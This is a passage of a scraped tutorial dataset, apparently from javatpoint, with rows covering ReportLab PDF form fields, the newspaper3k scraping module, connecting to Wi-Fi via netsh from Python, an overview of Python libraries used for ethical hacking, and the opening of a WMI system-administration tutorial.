'value1',"", 'selected = False,', 'x = 110,', 'y = 545,', ""buttonStyle = 'star',"", ""borderStyle = 'bevelled',"", ""shape = 'square',"", 'borderColor = blue,', 'fillColor = green,', 'borderWidth = 2,', 'textColor = magenta,', 'forceBorder = False', ')', 'form.radio(', ""name = 'radio3',"", ""tooltip = 'Field radio3',"", ""value = 'value2',"", 'selected = True,', 'x = 110,', 'y = 545,', ""buttonStyle = 'star',"", ""borderStyle = 'bevelled',"", ""shape = 'circle',"", 'borderColor = blue,', 'fillColor = green,', 'borderWidth = 2,', 'textColor = magenta,', 'forceBorder = True', ')', 'my_canvas.save()', ""if __name__ == '__main__':"", 'createSimpleRadios()', 'from reportlab.pdfgen import canvas', 'from reportlab.pdfbase import pdfform', 'from reportlab.lib.colors import magenta, pink, blue, green, red', 'def createSimpleChoices():', ""my_canvas = canvas.Canvas('choicesFile.pdf')"", 'my_canvas.setFont(""Courier"", 24)', ""my_canvas.drawCentredString(300, 700, 'Sample Choices')"", 'my_canvas.setFont(""Courier"", 16)', 'form = my_canvas.acroForm', ""my_canvas.drawString(10, 650, 'Choose a Letter:')"", ""my_options = [('A', 'Av'), 'B', ('C', 'Cv'), ('D', 'Dv'), 'E',('F', ), ('G', 'Gv')]"", 'form.choice(', ""name = 'choice1',"", ""tooltip = 'Field choice1',"", ""value = 'A',"", 'x = 165,', 'y = 645,', 'width = 72,', 'height = 20,', 'borderColor = magenta,', 'fillColor = pink,', 'textColor = blue,', 'forceBorder = True,', 'options = my_options)', ""my_canvas.drawString(10, 600, 'Choose a Programming language:')"", ""my_options = [('Python', 'python'), ('Java', 'java'), ('C++', 'C++')]"", 'form.choice(', ""name = 'choice2',"", ""tooltip = 'Field choice2',"", ""value = 'Python',"", 'options = my_options,', 'x = 305,', 'y = 595,', 'width = 72,', 'height = 20,', ""borderStyle = 'solid',"", 'borderWidth = 1,', 'forceBorder = True', ')', 'my_canvas.save()', ""if __name__ == '__main__':"", 'createSimpleChoices()', 'from reportlab.pdfgen import canvas', 'from reportlab.pdfbase import pdfform', 'from reportlab.lib.colors import magenta, pink, blue, green, red', 'def createSimpleListboxes():', ""my_canvas = canvas.Canvas('listboxesFile.pdf')"", 'my_canvas.setFont(""Courier"", 24)', ""my_canvas.drawCentredString(300, 700, 'Sample Listboxes')"", 'my_canvas.setFont(""Courier"", 16)', 'form = my_canvas.acroForm', ""my_canvas.drawString(10, 650, 'Choose a letter:')"", ""my_options = [('A','Av'),'B',('C','Cv'),('D','Dv'),'E',('F',),('G','Gv')]"", 'form.listbox(', ""name = 'listbox1',"", ""value = 'A',"", 'x = 165,', 'y = 590,', 'width = 72,', 'height = 72,', 'borderColor = magenta,', 'fillColor = pink,', 'textColor = blue,', 'forceBorder = True,', 'options = my_options,', ""fieldFlags = 'multiSelect'"", ')', ""my_canvas.drawString(10, 500, 'Choose a Programming language:')"", ""my_options = [('Python', 'python'), ('Java', 'java'), ('C++', 'C++')]"", 'form.listbox(', ""name = 'choice2',"", ""tooltip = 'Field choice2',"", ""value = 'Python',"", 'options = my_options,', 'x = 165,', 'y = 440,', 'width = 72,', 'height = 72,', ""borderStyle = 'solid',"", 'borderWidth = 1,', 'forceBorder = True', ')', 'my_canvas.save()', ""if __name__ == '__main__':"", 'createSimpleListboxes()', 'from reportlab.pdfgen import canvas', 'from reportlab.pdfbase import pdfform', 'from reportlab.lib.colors import magenta, pink, blue, green', 'def createSimpleForm():', ""my_canvas = canvas.Canvas('PDFform.pdf')"", 'my_canvas.setFont(""Courier"", 24)', ""my_canvas.drawCentredString(300, 700, 'Application Form')"", 'my_canvas.setFont(""Courier"", 16)', 'form = my_canvas.acroForm', ""my_canvas.drawString(10, 650, 'First Name:')"", 'form.textfield(', ""name = 'fname',"", ""tooltip = 'First Name',"", 'x = 110,', 'y = 635,', ""borderStyle = 'inset',"", 'borderColor = magenta,', 'fillColor = pink,', 'width = 300,', 'textColor = blue,', 'forceBorder = True', ')', ""my_canvas.drawString(10, 600, 'Last Name:')"", 'form.textfield(', ""name = 'lname',"", ""tooltip = 'Last Name',"", 'x = 110,', 'y = 585,', ""borderStyle = 'inset',"", 'borderColor = green,', 'fillColor = magenta,', 'width = 300,', 'textColor = blue,', 'forceBorder = True', ')', ""my_canvas.drawString(10, 550, 'Address:')"", 'form.textfield(', ""name = 'address',"", ""tooltip = 'Address',"", 'x = 110,', 'y = 535,', ""borderStyle = 'inset',"", 'width = 400,', 'forceBorder = True', ')', ""my_canvas.drawString(10, 500, 'City:')"", 'form.textfield(', ""name = 'city',"", ""tooltip = 'City',"", 'x = 110,', 'y = 485,', ""borderStyle = 'inset',"", 'forceBorder = True', ')', ""my_canvas.drawString(250, 500, 'State:')"", 'form.textfield(', ""name = 'state',"", ""tooltip = 'State',"", 'x = 350,', 'y = 485,', ""borderStyle = 'inset',"", 'forceBorder = True', ')', ""my_canvas.drawString(10, 450, 'Zip Code:')"", 'form.textfield(', ""name = 'zip_code',"", ""tooltip = 'Zip Code',"", 'x = 110,', 'y = 435,', ""borderStyle = 'inset',"", 'forceBorder = True', ')', 'my_canvas.save()', ""if __name__ == '__main__':"", 'createSimpleForm()']",[],[],['|||Checkbox|||Radio|||Choice|||Listbox|||Textfield|||']
383,['Python Newspaper Module'],"[""Most of us are often not interested in reading the complete newspaper or even a complete article. In such cases, we only want to know about keywords, titles, or many such smaller things of the article so that we don't have to spend so much reading a complete article. This also becomes useful when we only want to read selected articles, but we don't know how we can select useful articles for us. We all must be aware of what web scraping is and how it works. We also know that how much web scrapping is important and how it is helpful for us to extract all the useful information from a source website. We can also perform this operation on the newspaper websites too from where we can take a link of an article and scrap and curate useful information from that article. It is possible for us to perform all this by using a Python program, and for this task, Python provides us with a very useful module, i.e., Newspaper Module. We are going to learn about this Newspaper Module of Python in this tutorial, and we will learn how we can use this module to perform newspaper scrapping and curation using a Python program.""]","['https://www.javatpoint.com/how-to-connect-wi-fi-using-python', 'https://www.javatpoint.com/creating-interactive-pdf-forms-using-python', 'https://www.javatpoint.com/how-to-connect-wi-fi-using-python', 'https://www.javatpoint.com/creating-interactive-pdf-forms-using-python', 'https://www.javatpoint.com/how-to-connect-wi-fi-using-python']","['https://static.javatpoint.com/python/images/python-newspaper-module.png', 'https://static.javatpoint.com/python/images/python-newspaper-module2.png', 'https://static.javatpoint.com/python/images/python-newspaper-module3.png', 'https://static.javatpoint.com/python/images/python-newspaper-module4.png']",[],"['Newspaper Module in Python', 'Conclusion']","['Newspaper Module: Installation', 'Newspaper Module: Languages Supported', 'Newspaper Module: Implementation', 'Newspaper Module: Some Useful Functions']","[""Note: We should note that the Newspaper Module performs a web scrapping process on the online newspaper websites. That's why, if we make multiple requests simultaneously from a website, it may lead to blocking from that website. Therefore, we have to use this module accordingly whenever we actually need to use it."", 'Note: We should note that TOI removes some of their articles from time to time, and therefore, this article link of TOI given in the example may not work in the future. So, while using this example, we have to use a new link of another article.']","['Syntax for Creating an Instance:', 'Following syntax, we have to use in the program to create an instance for the article:', 'As we can see in the syntax written above, we have used the following two parameters:', 'Example 1: Look at the following Python program where we have used an article of TOI to perform newspaper scrapping with Newspaper Module:', ""We have successfully performed scrapping from the piece of article's link given in the code!"", 'Explanation:']","['We can see, Newspaper Module of Python is successfully installed in our system, and now, we can use functions from Newspaper Module by importing it into a Python program to perform newspaper scrapping.', ""We have now learned the syntax for creating an article's instance, and now we can move forward with the implementation part of the newspaper module. We will use the following example program to understand the implementation of this Newspaper Module."", 'After completing the installation process of the ntlk module, we can move ahead with the implementation part of the Newspaper Module and use it as an example program to perform newspaper scrapping.', 'These are all important functions of the Newspaper Module, and we can use them according to our choice of what type of information (like keywords, title, etc.) we want from the article.']","[""Newspaper in a Python Module, which is basically designed to curate useful information from a newspaper article. Therefore, we can use Python's Newspaper Module to perform scrapping and curation from an article by problem its web link in the Python program. We can retrieve all the useful information from an article, such as title, keywords, etc., by using the functions of the Newspaper Module. The newspaper Module of Python uses advanced algorithms with web scrapping features so that all the useful text can be extracted from a newspaper website. The Newspaper Module works very amazingly on the online newspaper websites we generally use in our daily life."", ""Newspaper Module is not a built-in module in Python, and therefore, we have to install this module first in our system, and only after that can we curate useful information from an article's web link. We can install this Newspaper Module from multiple sources and by using multiple methods, but the method we suggest is using the pip installer. Through pip installer, we can install the Newspaper Module very easily by using the following command in the command prompt terminal:"", 'Once we write the command given above in the terminal shell of our device, we should press enter key to start the installation process, and then we have to wait for a while for the completion of the installation process. Once the installation process of this Newspaper Module is completed, it will show us the following success installation message window in the terminal shell:', ""The Newspaper Module of Python supports it, and that's why it becomes even more popular because one can scrap news articles from their choice of language. Following languages are supported in the Newspaper Module, and their input codes are mentioned with them:"", ""We have to provide the input code of a language while we create an instance for an article's web link in the program. The language code we provide in the program will help the newspaper module to execute and use its specific set of algorithms for a particular language to scrape and curate from the article."", 'We have installed the newspaper module in our system, and now we all want to perform its implementation so that we can understand how this module works. Implementation of the newspaper module will also help us to learn how to curate multiple keywords and useful information from the article. But, before we use this newspaper module will in a Python program, we should note that we have to create an instance first for the article link. The instance for the article we create will fetch all the information from the article by using functions of the newspaper module. Therefore, first, we should learn about the syntax of the instance of the article and what parameters are used in it.', ""NLTK Module: The nltk module is also very important while performing the newspaper scrapping, and we have to use this module with the newspaper module in order to perform the newspaper scrapping on an article successfully. The nltk module is used to perform NLP on the article's link, and without performing NLP, we cannot curate useful information from the article. Therefore, while using the newspaper module in the example, we also have to use the nltk module with it and download the nltk data using the download('punkt') function in the program. We should also make sure that the ntlk module is installed in our system, and if it is not installed in our system, we can use the following command to install it:"", 'We have first imported the article from the newspaper module and nltk module in the program so that we can use the functions of both these modules to perform newspaper scrapping. After that, we gave an article\'s link (a TOI\'s latest article) inside the URL variable. Then, we initialized the instance of the article by using the article() function and gave initialized URL as an argument in it. Also, we have provided the language input code with the URL variable in the article() function. After that, we used the download() function to download the article in the program, and then we parsed the article using the parse() function. After that, we performed natural language processing (NLP) on the parsed article piece with the help of the nlp() function. Now, after performing NLP on the parsed article, we were able to print useful information from the article. Therefore, first, we used the "".title"" function to print the article\'s title, and then, we printed text from the article using the "".text"" function. Next, we printed the summary of the article using the "".summary"" function, and after that, we printed important keywords of the article using the "".keywords"" function.', ""When we performed the scrapping from the article's link using the newspaper module, we used some important functions to complete that task successfully. These functions are very useful to perform newspaper scrapping & curation and to print important information in the output. Here, in this section, we will learn about such important functions of the Newspaper Module, which are given below:"", ""It is not possible for all of us to read the complete newspaper and therefore, we want only useful information from the article. Newspaper Module provides us the option from where we can only get useful information of an article by performing newspaper scrapping on the article. We can perform newspaper scrapping using the functions of the Newspaper Module in a Python program and print all the useful information from an article's link in the output.""]","['pip install newspaper3k', 'instanceName = Article(urlOfArticle, language = ""language input code according to the article\'s language"")', 'pip install nltk', '# Import article from the newspaper module', 'from newspaper import Article', '# Import nltk module', 'import nltk', '# Download ntlk data', ""nltk.download('punkt')"", ""# URL of the TOI's news article"", 'urlOfArticle = ""http:// timesofindia.indiatimes.com/world/china/chinese-expert-warns-of-troops-entering-kashmir/articleshow/59516912.cms""', '# Creating instance for the article', 'instanceOfArticle = Article(urlOfArticle, language=""en"") # en is for English', '# Downloading the article piece from the program', 'instanceOfArticle.download()', '# Parsing the article', 'instanceOfArticle.parse()', '# Performing NLP on the article piece', 'instanceOfArticle.nlp()', '# Extracting title of the article', 'print(""Title of the article:"", instanceOfArticle.title)', 'print(""n"")', '# Extracting texts from the article', 'print(""Text from the article:"", instanceOfArticle.text)', 'print(""n"")', '# Extract summary of the article', 'print(""Summary of the article piece:"", instanceOfArticle.summary)', 'print(""n"")', '# Extracting important keywords of the article', 'print(""Important Keywords of the article:"", instanceOfArticle.keywords)', 'print(""n"")', 'print (""We have successfully performed scrapping from the piece of article\'s link given in the code!"")']",[],"['Sr. No.|||Language|||Input code for the language&&&1|||Arabic|||ar&&&2|||Chinese|||zh&&&3|||Greek|||el&&&4|||Danish|||da&&&5|||Italian|||it&&&6|||German|||de&&&7|||... and many more|||....', ""Sr No|||Function name|||Function's Working&&&1|||article()|||First, we have to create an article's instance to curate any useful information from the article's link given in the example, and we can use the article() function to create one.&&&2|||download()|||With the help of the download() function, we can download the article which URL we provided in the program.&&&3|||parse()|||After downloading the article, we have to parse the article, and we can do this using the parse() function.&&&4|||nlp()|||We also have to perform NLP on the parsed article before we curate any useful information from the article, and we can do this using the nlp() function.&&&5|||instanceName.title|||It is used to print the title of the article.&&&6|||instanceName.text|||We can use this function if we want to print the text of the article.&&&7|||instanceName.keywords|||This function is very helpful as it prints all the important keywords from the article.&&&8|||instanceName.summary|||If we want to print the summary of the article, we can use this function.""]","[""|||urlOfArticle: Here, we have to provide the article's web link from where we will curate the useful information from the article.|||Language: We have to provide the input code of the language in which the article is written.|||""]"
384,['How to Connect Wi-Fi using Python?'],"['Finding a computer without an active internet connection nowadays is nearly impossible. In the 21st Century, the Internet has been of supreme significance. There are various ways one can use to connect their system to the Internet. The first is the use of traditional cables, i.e., the Ethernet, and the other is the use of the modern Wireless Fidelity Systems, also known as Wi-Fi. Wi-Fi has made our lives much easier and faster. With a click of the mouse and a touch of the thumb, we get connected to a boundless ocean of data and resources nearly immediately. In the following tutorial, we will understand how to connect Wi-Fi using a high-level programming language, like Python.']","['https://www.javatpoint.com/best-python-libraries-used-for-ethical-hacking', 'https://www.javatpoint.com/python-newspaper-module', 'https://www.javatpoint.com/best-python-libraries-used-for-ethical-hacking', 'https://www.javatpoint.com/python-newspaper-module', 'https://www.javatpoint.com/best-python-libraries-used-for-ethical-hacking']",[],[],"['Establishing a connection with a Known Wi-Fi Network', 'Establishing the connection to a New Wi-Fi Network']",[],[],"[""So, let's get started."", 'The Methodology:', 'We will follow a simple procedure for this program:', 'Step 1: First of all, we will import the required libraries.', 'Step 2: Secondly, we will scan and display all the available SSIDs using the cmd commands and a Python library known as OS.', 'Step 3: We will then select the known Wi-Fi network to connect to and wait until it connects successfully.', 'Let us consider the following implementation to understand the above statement.', 'Explanation:', ""This string variable is then replaced with another cmd command where we are supposed to provide the SSID's name."", 'We will now be connected to the specific SSID successfully.', 'The Methodology:', 'Step 1: We will begin by importing the required library, that is, the OS library.', 'Step 2: We will then set up the XML configuration of the new Wi-Fi Network.', 'Step 3: Once the configuration is set, we will select the Wi-Fi Network.', 'Step 4: We will then add the profile of the Wi-Fi Network to the system.', 'Step 5: At last, we will get connected to the Wi-Fi Network.', 'Let us see the above procedure in action in the following example:', 'Explanation:']","['In the following section, we will discuss the procedure of connecting to a previously connected Wi-Fi network. In order to accomplish this task, we will follow the methodology described below:', 'In the above snippet of code, we have imported the OS library using the import keyword. We have then used the os.system() method in order to execute the following cmd command:', 'We have then accepted the input from the user for the SSID name and password. They are then fed into the XML code, which is then included as a profile with the help of the following lines of code:', 'We can now connect to the Wi-Fi with the help of the same commands we utilized before in the tutorial and connect to the network as if it was a known one.']","[""Since we have understood the procedure, let's begin the coding section. We will make utilization of some of the commands of the Windows Command Prompt in order to access the list of available Wi-Fi networks and connect to a known Wi-Fi network. However, how we can write and execute the commands of the Windows Command Prompt in a Python script."", 'The Python programming language offers a built-in library known as the OS library. This library provides the users the ability to communicate with the Operating System directly through Python script using various methods such as path(), getcwd(), system(), and a lot more. We can even execute the cmd commands with the help of the functions of the OS library.', 'The above command helps scanning all the available SSIDs and displays them as output along with their Infrastructure, Authentication, and Encryption type. We have then defined a variable as router_name that store the SSID value input by the user as a string.', 'In the following section, we will discuss the method for establishing the connection with a new Wi-Fi network in a few simple steps. Moreover, it is also important to add a new Wi-Fi network profile to the system with the help of an XML file in order to connect to a new network. This will make the Wi-Fi network a known SSID, and we will be able to connect to it successfully with the help of the following steps:', 'In the above snippet of code, we have imported the OS module and defined the create_new_connection function, which accepts the arguments as name, SSID, and password. These arguments are all strings that we have to complete in order to config variables. The config variable is a string that allows the programmers to define the XML configuration for a new Wi-Fi Network.']","['# importing the os library', 'import os', '# scanning the available Wi-Fi networks', 'os.system(\'cmd /c ""netsh wlan show networks""\')', '# providing the Wi-Fi name as input', ""router_name = input('Input Name/SSID of the Wi-Fi network we would like to connect: ')"", '# connecting to the provided Wi-Fi network', 'os.system(f\'\'\'cmd /c ""netsh wlan connect name = {router_name}""\'\'\')', 'print(""If the system is not connected yet, try reconnecting to an earlier connected SSID!"")', '\'cmd /c ""netsh wlan show networks""\'', 'f\'\'\'cmd /c ""netsh wlan connect name = {router_name}""\'\'\'', '# importing the os module', 'import os', '# defining the function to establish a new connection', 'def create_new_connection(name, SSID, password):', 'config = """"""<?xml version=\\""1.0\\""?>', '<WLANProfile xmlns = ""http://www.microsoft.com/networking/WLAN/profile/v1"">', '<name>"""""" + name + """"""</name>', '<SSIDConfig>', '<SSID>', '<name>"""""" + SSID + """"""</name>', '</SSID>', '</SSIDConfig>', '<connectionType> ESS </connectionType>', '<connectionMode> auto </connectionMode>', '<MSM>', '<security>', '<authEncryption>', '<authentication> WPA2PSK </authentication>', '<encryption> AES </encryption>', '<useOneX> false </useOneX>', '</authEncryption>', '<sharedKey>', '<keyType> passPhrase </keyType>', '<protected> false </protected>', '<keyMaterial>"""""" + password + """"""</keyMaterial>', '</sharedKey>', '</security>', '</MSM>', '</WLANProfile>""""""', 'wlan_command = ""netsh wlan add profile filename =\\"""" + name + "".xml\\"""" + "" interface = Wi-Fi""', 'with open(name + "".xml"", \'w\') as file:', 'file.write(config)', 'os.system(wlan_command)', '# defining function to connect to a network', 'def wlan_connect(name, SSID):', 'wlan_command = ""netsh wlan connect name =\\"""" + name + ""\\"" ssid =\\"""" + SSID + ""\\"" interface = Wi-Fi""', 'os.system(wlan_command)', '# defining function to display avavilabe Wi-Fi networks', 'def display_available_networks():', 'wlan_command = ""netsh wlan show networks interface = Wi-Fi""', 'os.system(wlan_command)', '# displaying the available netwroks', 'display_available_networks()', '# inputing the Wi-Fi name and password', 'name = input(""Enter the Name of Wi-Fi: "")', 'password = input(""Enter the Password: "")', '# establishing a new connection', 'create_new_connection(name, name, password)', '# connecting to the Wi-Fi network', 'wlan_connect(name, name)', 'print(""If the system is not connected to this network, try connecting with the correct password!"")', 'my_command = ""netsh wlan add profile filename =\\"""" + name + "".xml\\"""" + "" interface = Wi-Fi""', 'with open(name+"".xml"", \'w\') as file:', 'file.write(config)', 'os.system(my_command)']","['Interface name : Wi-Fi', 'There are 11 networks currently visible.', 'SSID 1 : Benny', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 2 : Honest', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 3 : Sushii', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 4 : Amazon', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 5 : Unagi91', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 6 : Printer.5G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 7 : Printer 2.4G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 8 : Willett', 'Network type            : Infrastructure', 'Authentication          : WPA-Personal', 'Encryption              : CCMP', 'SSID 9 : MARK1', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 10 : Disconnect', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 11 : MARK1_5G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'Input Name/SSID of the Wi-Fi network we would like to connect: MARK1_5G', 'Connection request was completed successfully.', 'If the system is not connected yet, try reconnecting to an earlier connected SSID!', 'Interface name : Wi-Fi', 'There are 11 networks currently visible.', 'SSID 1 : Benny', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 2 : Honest', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 3 : Sushii', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 4 : Amazon', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 5 : Unagi91', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 6 : Printer.5G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 7 : Printer 2.4G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 8 : Willett', 'Network type            : Infrastructure', 'Authentication          : WPA-Personal', 'Encryption              : CCMP', 'SSID 9 : MARK1', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 10 : Disconnect', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'SSID 11 : MARK1_5G', 'Network type            : Infrastructure', 'Authentication          : WPA2-Personal', 'Encryption              : CCMP', 'Enter the Name of Wi-Fi: MARK1_5G', 'Enter the Password: Thereisnopassword.', 'Connection request was completed successfully.', 'If the system is not connected to this network, try connecting with the correct password!']",[],[]
385,['Best Python Libraries used for Ethical Hacking'],"['Python is one of the fastest-growing programming languages around the world, and it is not difficult to understand the reason behind it. Python is an open-source high-level programming language that is easy to learn and use for beginners. It is widely utilized in Web Development, Data Science, Machine Learning, and Artificial Intelligence.']","['https://www.javatpoint.com/windows-system-administration-management-using-python', 'https://www.javatpoint.com/how-to-connect-wi-fi-using-python', 'https://www.javatpoint.com/windows-system-administration-management-using-python', 'https://www.javatpoint.com/how-to-connect-wi-fi-using-python', 'https://www.javatpoint.com/windows-system-administration-management-using-python']",[],[],"['Understanding the Scapy library', 'Understanding the Requests library', 'Understanding the IMpacket library', 'Understanding the pwntools library', 'Understanding the Cryptography library', 'Understanding the Python-nmap library', 'Understanding the Faker library', 'Understanding the Twisted library', 'Understanding the Pylibnet module', 'Understanding the RawSocketPy library']","['How to install the Scapy library?', 'How to install the Requests library?', 'How to install the IMpacket library?', 'How to install the Cryptography library?', 'How to install the Python-nmap library?', 'How to install the Faker library?', 'How to install the Twisted library?']",[],"['In the following tutorial, we will discuss some of the best libraries of Python that can be used for ethical hacking (or penetration testing).', 'Some of these Python libraries are as follows:', 'We can install the Python Scapy library in the system using the pip installing following the command given below:', 'We can install the Python Requests library in the system using the pip installing following the command given below:', 'We can install the Python IMpacket library in the system using the pip installing following the command given below:', 'Generally, Cryptography is the backbone of a secure internet.', 'We can install the Python Cryptography library in the system using the pip installing following the command given below:', 'We can install the Python Python-nmap library in the system using the pip installing following the command given below:', 'We can install the Python Faker library in the system using the pip installing following the command given below:', 'HTTP, IRC, NNTP, SMTP, POP3, IMAP, SSHv2, and DNS.', 'Twisted supports both synchronous and asynchronous networking paradigm.', 'We can install the Python Twisted library in the system using the pip installing following the command given below:', 'For more details, one can check the official documentation of the Pylibnet module.', 'For more details, one can check the official documentation of the RawSocketPy library.']","['Python is also a famous choice for security professionals and ethical hackers because of its versatile nature and the wide range of libraries that we can use in order to assist in ethical hacking.', 'Moreover, cybersecurity professionals and hackers utilize Python scripts to analyze malware and identify vulnerabilities. However, there are some programmers who write exploit programs with the help of the Python programming language.', 'Scapy is a complete interactive packet manipulation library written by Philippe Biondi in the Python programming language. This library is primarily used to perform two functions: sending packets and receiving responses.', 'Requests is an HTTP python library utilized in order to send HTTP/HTTPS requests in an easy manner. The Requests library is an amazingly versatile and useful utility to write Python codes that need interaction with web services.', 'Some features of the Python Requests library are Keep-Alive and Connection pooling, international domains and URLs, browser-style SSL verification, sessions with cookie persistence, and a lot more.', 'The pwntools library acts as a Capture-the-Flag (CTF) framework and exploits the development library written in the Python programming language. It is designed in order to facilitate rapid prototyping and development.', 'The pwntools library offers an array of useful utilities for automating reverse engineering, penetration testing, fuzzing programs, creating exploits, and a lot more.', 'It allows users to create activities for tasks in CTF competitions swiftly. This library works efficiently with 64-bit Ubuntu LTS releases and has various modules that allow for rapid activity development and flexibility while scripting rogue code.', 'Cryptography is a library that offers recipes and primitives to Python developers for cryptography. This involves encryption, generating a random number, hashing, ciphers, and signatures for block and stream ciphers.', 'Pylibnet is a Python module for the libnet packet injection library. This module offers a Python API for libnet, along with the functionality for sending packets, showing libpcap traces, and sniffing frames.', 'RawSocketPy is a layer 2 Python library used for communication with the help of the MAC addresses only. This library enables us to implement a custom layer 2 communication with the help of Raw Sockets in Python, Synchronous, and Asynchronous.']","['Ethical hacking, also known as Penetration testing, is the practice of legally breaking into computers and devices to test the security of computer programs, networks, and data. As Python developers, we can develop tools for ethical hacking with ease making the scripts more effective and efficient.', 'We can use Scapy to decode or forge packets of a range of protocols, send them, receives responses, matches requests with responses, and returns a list of packets couples and a list of unmatched packets. We can easily handle many common activities such as network scanning, network discovery, tracerouting, probing, attacks, and a lot more, using this library.', 'The objective of Scapy is to make packet manipulation simply by offering a set of functionalities that fills in the gap between low-level network programming and high-level protocols. This is an amazing utility, to begin with, packet manipulation. It is easy to use; however, it has a steep learning curve.', 'This library provides a convenient interface for sending HTTP requests and handling responses. We can use Requests for anything from sending simple requests to fetching complex data from Application Programming Interfaces (APIs) to scrapping websites.', 'The Requests library serves as a basic utility used for hacking since most hacking tasks need communication with remote servers and fetching resources over the internet. If some of us are not familiar with the Python Requests library, the official documentation is the best place to begin.', 'The IMpacket library is a set of Python classes to work with network protocols. This library is currently centered on offering help for low-level socket programming, TCP/IP, and many higher-level protocols. It is a Python library that makes it simple for developers to create and decode packets of a network.', 'There are many penetration testers and hackers that make use of IMpacket in order to design custom network-based intrusion attacks like a man in the middle and session hijacking. It was originally designed as an internal utility to support the testers with their testing; however, it has become a powerful tool for hackers that can be utilized against networks.', 'The objective of the IMpacket library is to make Network programming easier for Python programmers and developers. It is used to provide a framework to implement custom protocols. For instance, we can use the IMpacket library to implement custom versions of the TCP/IP stack for a specified target platform.', 'This library offers a high-level Application Programming Interface (API) to cryptographically strong algorithms such as digital signatures and low-level cryptographic building blocks developed with performance in mind. Ethical hacking makes use of this ability to encrypt and decrypt sensitive data shared on the internet.', 'Python-nmap is a Python library that supports programmers with the Nmap port scanner. Nmap is a network administration and security auditing tool typically used for discovering services and hosts available on a network. However, we can use it in order to examine a single host also.', 'The Python-nmap library is considered as a Python wrapper for the Nmap tool that allows the programmer to easily access, utilize and manipulate the features and ability of Nmap in Python. It does not replace the Nmap tool; it only offers an interface to interact with Nmap.', 'It provides different features for accomplishing various tasks like port scanning, host discovery, and TCP/IP fingerprinting. This package is a perfect utility for hackers and systems administrators who prefer to automate tasks and reports based on network scanning. It also helps in Nmap script outputs.', 'Faker is a Python library used to generate fake information. The Faker library can generate anything ranging from names, mobile numbers, and addresses to fake texts, bibliography entries, XML documents, and many more. This library is quite easy to use. We can call the faker.name() function to order to get a random name, or the faker.address() function to get a fake address.', 'It comes with many other functions to generate fake data. There can be any reason we might want to use Faker. For instance, we require to fill up a database using the fake data for a prototype, or we might have to remain anonymous online with the help of fake credentials or addresses.', 'The Twisted library is an event-driven networking engine written in the Python programming language. This library offers an abstraction of the TCP protocol, making it easy to script network servers and clients. It is specifically recognized for its broad support of SSL, IPv6, and many protocols, including the following:']","['$ pip install scapy', '$ pip install requests', '$ pip install impacket', '$ pip install cryptography', '$ pip install python-nmap', '$ pip install faker', '$ pip install twisted']",[],[],['|||Scapy|||Requests|||IMpacket|||pwntools|||Cryptography|||python-nmap|||Faker|||Twisted|||pylibnet|||RawSocketpy|||']
386,['Windows System Administration Management using Python'],"['Managing the activities of Windows System Administration manually can be exhausting. What if we could set up a few Python codes instead of managing these tasks manually. In the following tutorial, we will discover one such module that allows the program to perform different processes based on System Administration. This Python module is known as the WMI module.']","['https://www.javatpoint.com/indentation-error-in-python', 'https://www.javatpoint.com/best-python-libraries-used-for-ethical-hacking', 'https://www.javatpoint.com/indentation-error-in-python', 'https://www.javatpoint.com/best-python-libraries-used-for-ethical-hacking', 'https://www.javatpoint.com/indentation-error-in-python']",[],[],"['How to Install the Python wmi Module?', 'Establishing a Connection', 'Finding Methods and Properties of WMI Class', 'Handling Process', 'Handling Services']","['Verifying the Installation', 'Finding a WMI Class']",[],"['Once the module is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:', 'File: verify.py', 'Now, save the above file and execute it using the following command in a terminal:', 'From these extracted classes, we can filter out particular keywords to find a specific class we are looking for, as shown in the following example:', 'Explanation:', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'Let us consider the following script to understand the same:', 'Explanation:', 'WMI Module also allows programmers to begin a new process and kill any existing one.', 'Explanation:', 'We can adapt a similar approach in order to list and filter out services working on a machine with the help of the WMI class called Win32_Service.', 'Let us consider the following snippet of code demonstrating the same:', 'Explanation:', 'We can perform several other functionalities with these classes, such as starting and stopping service and a lot more.']","['Python offers the wmi module that acts as a lightweight wrapper around available WMI classes and functionalities and could be utilized by the Systems Administrators in order to query data from the local or remote Windows machines.', 'In this tutorial, we will understand how to use the wmi module to perform various activities based on Windows System Administration. But before we get to it, let us begin by installing the required module.', 'In the following section, we will begin by establishing a connection to a machine. Most of the time, we will connect to the local machine with the help of the following Python syntax:', 'In the above snippet of code, we have imported the wmi module and established a connection to the local machine. We have then extracted the class names from the wmi module using the for-loop iterating through each class available in the module.', ""Since we have gathered the information regarding the methods and properties of class 'Win32_Process', we will now use the class name of WMI followed by an open & close parenthesis in order to return objects of the WMI class."", 'Let us consider the following example demonstrating the same where we have created a new process then stored the Process ID to uniquely identify the process so that we can terminate it later using that ID:']","['WMI, abbreviated for 